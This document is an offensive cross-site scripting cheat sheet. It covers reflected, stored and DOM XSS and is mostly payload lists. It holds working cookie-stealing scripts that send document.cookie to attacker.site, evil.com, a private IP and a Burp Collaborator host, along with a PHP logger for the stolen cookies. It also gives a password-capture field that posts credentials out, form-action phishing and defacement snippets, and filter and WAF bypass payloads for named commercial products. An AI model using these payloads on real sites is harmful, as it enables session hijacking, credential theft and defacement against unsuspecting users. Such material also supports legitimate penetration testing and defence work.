# Cross-site Scripting

Introduction

XSS happens when the user input is given as output without sanitization on input and output.

- Find the blacklisted/filtered characters. You can use XSS locators for this:

```none
'';! - "<XSS>=&{()}
```

Goals of XSS:

1. Cookie stealing
    
2. Complete control on browser
    
3. Initiating an exploitation phase against browser plugins first and and the machine
    
4. Keylogging
    

3 types:

1. Reflected (Server side code is vulnerable)
    
2. Stored
    
3. DOM (Client side code is vulnerable)
    

Reflected XSS

Victims bring the payload in the HTTP request to the vulnerable website. Then the browser renders the payload in the victim's context.

`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:

You searched for: gift

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

Persistent XSS

Persistent XSS is able to deface a webpage.

This type of attack does not need the victims to click on any links. It happens when a victim browses a vulnerable page injected with persistent XSS code.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

url encoded with xss:

```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

DOM-based XSS

Make use of the HTML tree.

The document.write sink works with script elements, so you can use a simple payload such as:

```
document.write('... <script>alert(document.domain)</script> ...');
```

The innerHTML sink doesn’t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:

```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```


Find XSS

Input could be:

1. GET/POST variables
    
2. COOKIE
    
3. HTTP HEADERS
    

First, try to inject `<plaintext>` tag to see if the page will be broken after.

Then, check if we can inject script using `<script>` or using one of the DOM events (e.g. `<h1>`).

When inspecting the source code, look for all the points where the application outputs data (totally / partially) supplied by the user without sanitization and tracking it back to the source where it is retrieved for the first time.

### XSS between html tags

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### xss in html tag attributes

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

```
"><script>alert(document.domain)</script>
```

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

```
" autofocus onfocus=alert(document.domain) x="
```

```
<a href="javascript:alert(document.domain)">
```

### xss in javascript

**Terminating the existing script** In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:

```
</script><img src=1 onerror=alert(document.domain)>
```

**Breaking out of a JavaScript string**

```
'-alert(document.domain)-'
';alert(document.domain)//
```

**Making use of HTML-encoding**

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. For example, if the XSS context is as follows:

```
<a href="#" onclick="... var input='controllable data here'; ...">
```

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

```
&apos;-alert(document.domain)-&apos;
```

The ' sequence is an HTML entity representing an apostrophe or single quote

**XSS in JavaScript template literals** JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${…} syntax.

For example, the following script will print a welcome message that includes the user’s display name:

document.getElementById(‘message’).innerText = `Welcome, ${user.displayName}.`;

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${…} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:

```
<script>
...
var input = `controllable data here`;
...
</script>
```

then you can use the following payload to execute JavaScript without terminating the template literal:

```
${alert(document.domain)}
```




XSS tricks

Simple: `<script>alert('xss')</script>` IMG tag onload: `<img src="xxx" onload="javascript:alert('xss')">` `<img src="xxx" onload="alert('xss')">` `<img src="xxx" onload="alert(String.fromCharCode(88,83,83))">`

XSS Exploit

Cookie Stealing

1. Find injection point
    
2. Read the cookie using JS
    
3. Redirect the cookie to attacker server
    
4. Retrieve and install the stolen cookie on browser
    

Example:

```
<script>
var i = new Image(); 
i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
</script>
```

Note `%2b` = `+`

The `steal.php` could be:

```
$fn = "log.txt";
$fh = fopen($fn, 'a');
$cookie = $_GET['q'];
fwrite($fh, $cookie);
fclose($fh)
```

We can also do some other thing, for example, change `form action` location:


```
document.forms[0].action="http://attacker.site/steal.php";
```


## steal cookies

```
<script>
new Image().src="http://192.168.30.5:81/bogus.php?ouput="+document.cookie;
</script>
```

```
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

## capture passwords

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```




Web Defacement

- Make use of Persistent XSS
    
- Change the appearance of the web by manipulating the DOM
    


```
document.body.innerHTML="<h1>What!</h1>";
```

Phishing

- By modifying the form action's destination
    

```
document.forms[0].action="https://hacker.site/thanks.php";
```



---

### Top XSS Payloads

1-`<script>alert("1")</script>`

2-`<sCript> alert("bypassing simple filters") </sCRIpt>`

3-`<a onmouseover="alert(document.cookie)">xxs link</a> | <a onmouseover=alert(document.cookie)>xxs link</a>`

4-`<img src='zzzz' onerror='alert(1)' />`

5-`<div style="color:red" onclick=alert('xss')>`| Coloring is adding to see the div

6-`<div style="color:green" onmouseover=alert('xss') >`

7-`<script>console.log("test")</script>` **Testing if the word "alert" is allowed in the script**

8- `<img src="cc" onerror=eval(String'fromCharCode')>` |**alert is not allowed**

9-`</script><script>alert('XSS');</script>`|**escaping script tags to excute the payload**

10-`';alert('xss');//`| The apostrophe character is used to escape in PHP htmlentities**'**

11-`' onerror=alert('xss');>` | use this if the vulnerability in the image

12-`#<script>alert(1)</script>` | **exploiting the DOM xss with hash.substring**

13-`#javascript:alert(1)` | **exploiting the DOM xss with hash.substring**

14-`" onmouseover="alert(1)` |

15-`<script> var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)</script>`|**to get cookie**

16-`“><script >alert(document.cookie)</script >`|**to get cookie**

17-`“><ScRiPt>alert(document.cookie)</ScRiPt>`

18-`“%3e%3cscript%3ealert(document.cookie)%3c/script%3e`

19-`“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>`

20-`%00“><script>alert(document.cookie)</script>`

21-`<object data=”data:text/html,<script>alert(1)</script>”>`

22-`<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`

23-`<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`

24-`Click here</a>`

25-`<img o[%00]nerror=alert(1) src=a>`| to bypass attribute filters

26-`<img onerror=”alert(1)”src=a>`| attribute delimiter

27-`<img onerror=’alert(1)’src=a>`| attribute delimiter

28-`<img onerror=`alert(1)`src=a>`| attribute delimiter

29-`<img onerror=a[%00]lert(1) src=a>`| attribute value

30-`<img onerror=a&#x6c;ert(1) src=a>`| attribute value

31- `<img src='nevermind' onerror="alert('XSS');" />` **| DOM**


---

## Cross-Site Scripting (XSS) Cheatsheet

```none
--------------------------------------------------------------------
XSS Locators:
'';!--"<XSS>=&{()}
--------------------------------------------------------------------
Classic Payloads:
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
--------------------------------------------------------------------
script tag filter bypass:
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
--------------------------------------------------------------------
HTML tags:
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=`x`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
--------------------------------------------------------------------
Other tags:
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
--------------------------------------------------------------------CharCode:
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
--------------------------------------------------------------------
if the input is already in script tag:
@domain.com">user+'-alert`1`-'@domain.com
--------------------------------------------------------------------AngularJS: 




toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
--------------------------------------------------------------------
Scriptless:
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?
--------------------------------------------------------------------
Unclosed Tags:
<svg onload=alert(1)//
--------------------------------------------------------------------
DOM XSS:
“><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
javascript:alert(document.cookie)
\“-alert(1)}//
<><img src=1 onerror=alert(1)>
--------------------------------------------------------------------
Another case:
param=abc`;return+false});});alert`xss`;</script>
abc`; Finish the string
return+false}); Finish the jQuery click function
}); Finish the jQuery ready function
alert`xss`; Here we can execute our code
</script> This closes the script tag to prevent JavaScript parsing errors
--------------------------------------------------------------------
```

#### Restrictions Bypass

```none
--------------------------------------------------------------------
No parentheses:
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert`1`</script>
<script>new Function`X${document.location.hash.substr`1`}`</script>
--------------------------------------------------------------------
No parentheses and no semicolons:
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
--------------------------------------------------------------------
No parentheses and no spaces:
<script>Function`X${document.location.hash.substr`1`}```</script>
--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):
“onmouseover=“alert(1)
‘-alert(1)-’
--------------------------------------------------------------------
If quote is escaped:
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//
--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
--------------------------------------------------------------------
Other:
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
--------------------------------------------------------------------
```

#### Encoding

```none
--------------------------------------------------------------------
Unicode:
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>
--------------------------------------------------------------------
Hex:
<script>eval('\x61lert(1)')</script>
--------------------------------------------------------------------
HTML:
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//
--------------------------------------------------------------------
URL:
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
--------------------------------------------------------------------
Double URL Encode:
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
--------------------------------------------------------------------
Unicode + HTML:
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
--------------------------------------------------------------------
HTML + URL:
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
--------------------------------------------------------------------
```

#### WAF Bypass

```none
--------------------------------------------------------------------
Imperva Incapsula:
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
--------------------------------------------------------------------WebKnight:
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
F5 Big IP:
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
--------------------------------------------------------------------Barracuda WAF:
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
PHP-IDS:
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"
--------------------------------------------------------------------
Mod-Security:
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
--------------------------------------------------------------------
Quick Defense:
<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">
--------------------------------------------------------------------
Sucuri WAF:
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
--------------------------------------------------------------------
```


